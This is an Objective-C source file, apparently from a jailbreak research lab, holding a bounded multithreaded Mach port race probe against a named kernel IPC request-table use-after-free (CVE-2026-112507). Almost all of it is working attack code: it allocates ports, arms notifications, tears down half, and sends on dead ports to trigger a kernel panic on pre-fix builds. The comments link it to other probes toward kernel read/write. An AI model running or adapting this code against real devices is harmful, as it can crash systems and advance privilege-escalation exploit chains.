//
//  P125KernIpcRace.m — mach-namespace REQUEST-TABLE stale-index race
//  (CVE-2026-112507, Cinder27 kern.ipc, vendored jbjflab). p125. P007 rig.
//
//  Mechanism (their C twin ported verbatim, bounded): each ring allocates
//  RECEIVE rights, arms TWO notification kinds per port
//  (MACH_NOTIFY_SEND_POSSIBLE + MACH_NOTIFY_DEAD_NAME, self-notification
//  arms with MACH_MSG_TYPE_MAKE_SEND), tears down HALF the ring while the
//  other half still holds armed notifications, sends on the dead half,
//  then releases everything. The interleaving is what the kernel's
//  per-space port-request-table index consumers must survive; 27.2 added
//  ipr != NULL / table != NULL checks — PRE-FIX on our trains.
//
//  The SIGKILL law (their comment + ours): mod_refs with a negative delta
//  against a zero send-ref count does NOT return an error on-device — it
//  kils the task. Every mod_refs is get_refs-guarded above 0 first.
//
//  VERDICT classes (honest): refused notifications / the err-code census =
//  the race shape; refused > 0 with budget NOT exhausted = the stale-index
//  candidate signal; a panic = the UAF attestation (decode the ips).
//  BOUNDED: 5s, budget 6000 ops, depth 48 — the Cinder27 numbers.
//

#import "P125KernIpcRace.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <time.h>
#import <unistd.h>

#define P125_BUILD       @"p125-kernipcrace-v2"
#define P125_SECONDS     5.0
#define P125_WORKERS     4
#define P125_BUDGET      6000
#define P125_DEPTH       48
#define P125_ERRSLOT_N   32

typedef struct {
    long operations, allocations, notifications, sends, deallocations;
    int budget_exhausted;
    long notifications_refused;
    long budget;
    int err_codes[P125_ERRSLOT_N]; long err_counts[P125_ERRSLOT_N];
    int nerrs;
    pthread_mutex_t lock;
} p125stats_t;

static p125stats_t gp_stat;
static double gp_deadline;
static NSMutableString *g_buf;

static void L(NSString *s) {
    if (!g_buf) return;
    [g_buf appendString:s];
    if (![s hasSuffix:@"\n"]) [g_buf appendString:@"\n"];
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static BOOL p125_past_deadline(void) {
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    return (double)now.tv_sec + (double)now.tv_nsec / 1e9 >= gp_deadline;
}

static void record(kern_return_t kr) {
    if (kr == KERN_SUCCESS) return;
    pthread_mutex_lock(&gp_stat.lock);
    int slot = -1;
    for (int i = 0; i < gp_stat.nerrs; i++)
        if (gp_stat.err_codes[i] == kr) { slot = i; break; }
    if (slot < 0 && gp_stat.nerrs < P125_ERRSLOT_N) {
        slot = gp_stat.nerrs++;
        gp_stat.err_codes[slot] = kr;
    }
    if (slot >= 0) gp_stat.err_counts[slot]++;
    pthread_mutex_unlock(&gp_stat.lock);
}


typedef struct { long alloc, notify, send, dealloc; } p125ring;

static p125ring p125_ring(mach_port_t task, int depth, int *budget, long *refused) {
    p125ring r = {0, 0, 0, 0};
    mach_port_name_t ports[512];
    int nports = 0;
    if (depth > 512) depth = 512;

    for (int i = 0; i < depth; i++) {
        if (*budget <= 0) break;
        mach_port_name_t name = 0;
        kern_return_t kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &name);
        if (kr == KERN_SUCCESS) { ports[nports++] = name; r.alloc++; (*budget)--; }
        else { record(kr); break; }
    }

    for (int i = 0; i < nports; i++) {
        mach_port_t p = ports[i];
        mach_port_t prev = 0;
        kern_return_t kr1 = mach_port_request_notification(
            task, p, MACH_NOTIFY_SEND_POSSIBLE, 1, p,
            (mach_msg_type_name_t)MACH_MSG_TYPE_MAKE_SEND, &prev);
        if (kr1 != KERN_SUCCESS) {
            record(kr1);
            if (kr1 == KERN_INVALID_CAPABILITY) (*refused)++;
        }
        if (prev != 0) mach_port_mod_refs(task, prev, MACH_PORT_RIGHT_SEND, -1);
        r.notify++;

        mach_port_t prev2 = 0;
        kern_return_t kr2 = mach_port_request_notification(
            task, p, MACH_NOTIFY_DEAD_NAME, 0, p,
            (mach_msg_type_name_t)MACH_MSG_TYPE_MAKE_SEND, &prev2);
        if (kr2 != KERN_SUCCESS) {
            record(kr2);
            if (kr2 == KERN_INVALID_CAPABILITY) (*refused)++;
        }
        if (prev2 != 0) mach_port_mod_refs(task, prev2, MACH_PORT_RIGHT_SEND, -1);
        r.notify++;
    }

    for (int i = 0; i < nports; i += 2) {
        mach_port_t p = ports[i];
        mach_port_urefs_t refs = 0;
        if (mach_port_get_refs(task, p, MACH_PORT_RIGHT_SEND, &refs) == KERN_SUCCESS && refs > 0) {
            kern_return_t kr = mach_port_mod_refs(task, p, MACH_PORT_RIGHT_SEND, -1);
            if (kr != KERN_SUCCESS) record(kr);
        }
        r.dealloc++;
    }

    for (int i = 1; i < nports; i += 2) {
        mach_port_t p = ports[i];
        mach_msg_header_t header;
        memset(&header, 0, sizeof header);
        header.msgh_bits = (mach_msg_bits_t)MACH_MSG_TYPE_COPY_SEND;
        header.msgh_size = (mach_msg_size_t)sizeof header;
        header.msgh_remote_port = p;
        header.msgh_local_port = 0;
        header.msgh_id = 0;
        kern_return_t kr = mach_msg_send(&header);
        if (kr != KERN_SUCCESS) record(kr);
        r.send++;
    }

    for (int i = 0; i < nports; i++) {
        mach_port_t p = ports[i];
        mach_port_urefs_t urefs = 0;
        if (mach_port_get_refs(task, p, MACH_PORT_RIGHT_SEND, &urefs) == KERN_SUCCESS && urefs > 0)
            mach_port_mod_refs(task, p, MACH_PORT_RIGHT_SEND, -(mach_port_delta_t)urefs);
        kern_return_t kr = mach_port_destruct(task, p, 0, 0);
        if (kr != KERN_SUCCESS) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
            mach_port_destroy(task, p);
#pragma clang diagnostic pop
        }
        r.dealloc++;
    }
    return r;
}

static void *p125_worker(void *arg) {
    (void)arg;
    long la = 0, ln = 0, ls = 0, ld = 0, lops = 0;
    while (!p125_past_deadline()) {
        pthread_mutex_lock(&gp_stat.lock);
        int remaining = (int)gp_stat.budget;
        pthread_mutex_unlock(&gp_stat.lock);
        if (remaining <= 0) {
            pthread_mutex_lock(&gp_stat.lock);
            gp_stat.budget_exhausted = 1;
            pthread_mutex_unlock(&gp_stat.lock);
            break;
        }
        int slice = P125_DEPTH < remaining ? P125_DEPTH : remaining;
        long refused = 0;
        p125ring res = p125_ring(mach_task_self(), slice, &slice, &refused);
        if (refused > 0) {
            pthread_mutex_lock(&gp_stat.lock);
            gp_stat.notifications_refused += refused;
            pthread_mutex_unlock(&gp_stat.lock);
        }
        la += res.alloc; ln += res.notify; ls += res.send; ld += res.dealloc;
        lops += 4;
        pthread_mutex_lock(&gp_stat.lock);
        gp_stat.budget -= res.alloc;
        pthread_mutex_unlock(&gp_stat.lock);
    }
    pthread_mutex_lock(&gp_stat.lock);
    gp_stat.operations += lops; gp_stat.allocations += la;
    gp_stat.notifications += ln; gp_stat.sends += ls; gp_stat.deallocations += ld;
    pthread_mutex_unlock(&gp_stat.lock);
    return NULL;
}

@implementation P125KernIpcRace

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    memset(&gp_stat, 0, sizeof gp_stat);
    gp_stat.budget = P125_BUDGET;
    pthread_mutex_init(&gp_stat.lock, NULL);

    Lf(@"=== p125 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P125_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] CVE-2026-112507 (Cinder27 kern.ipc, vendored jbjflab): xnu's");
    L(@"  per-space port request-table index consumers raced by the");
    L(@"  alloc/notify/teardown interleave; 27.2 ships the ipr/table NULL");
    L(@"  checks = PRE-FIX LIVE on 23F77(26.5) + 24A435(27.0). 27.2 = the");
    L(@"  negative control on your beta test.");
    L(@"[warn] PANIC-POSSIBLE (kernel UAF class) — one tap per force-quit.");
    L(@"[IN FLIGHT] race begins: 4 workers x depth-48 rings, budget 6000, 5s.");

    struct timespec t0;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    gp_deadline = (double)t0.tv_sec + (double)t0.tv_nsec / 1e9 + P125_SECONDS;

    pthread_t tt[P125_WORKERS];
    int nrun = 0;
    for (int i = 0; i < P125_WORKERS; i++)
        if (pthread_create(&tt[i], NULL, p125_worker, NULL) == 0) nrun++;
    for (int i = 0; i < nrun; i++) pthread_join(tt[i], NULL);

    Lf(@"[*] done: operations=%ld allocations=%ld notifications=%ld sends=%ld",
       gp_stat.operations, gp_stat.allocations, gp_stat.notifications, gp_stat.sends);
    Lf(@"    deallocations=%ld refused=%ld budget_exhausted=%d",
       gp_stat.deallocations, gp_stat.notifications_refused, gp_stat.budget_exhausted);
    for (int i = 0; i < gp_stat.nerrs; i++)
        Lf(@"    err 0x%08x (%s) x%ld", gp_stat.err_codes[i],
           mach_error_string(gp_stat.err_codes[i]) ?: "?", gp_stat.err_counts[i]);

    L(@"");
    L(@"=== VERDICT (honest — the Cinder27 recorded-oracle semantics) ===");
    L(@"- their own twin's printed verdict = 'survived the interleaving, no");
    L(@"  request-table fault surfaced' AND 'this platform does not allow");
    L(@"  notification registration on own ports — the path cannot be armed'.");
    L(@"- our all-notify-rejected + survived = the SAME class as their twin:");
    L(@"  the ring is FAITHFUL; the CVE's DEVICE-REACHABLE arming = still the");
    L(@"  open question (no public PoC has shown the fault on-device).");
    L(@"- a request-table PANIC (if one ever lands) = the UAF attestation;");
    L(@"  err-distribution shifts across boots = the weak oracle re-check.");
    L(@"hasKread=NO. Honest: this probe documents the class, it does not");
    L(@"  demonstrate the fault; do not count it toward KRW receipts.");
    L(@"hasKread=NO. Composition note: this is the kernel-UAF WRITE-adjacent");
    L(@"  class; pairs with p126 (the decmpfs read prong) and p044 (EMBERFORGE).");
    return g_buf ?: @"(no p125 log)";
}

@end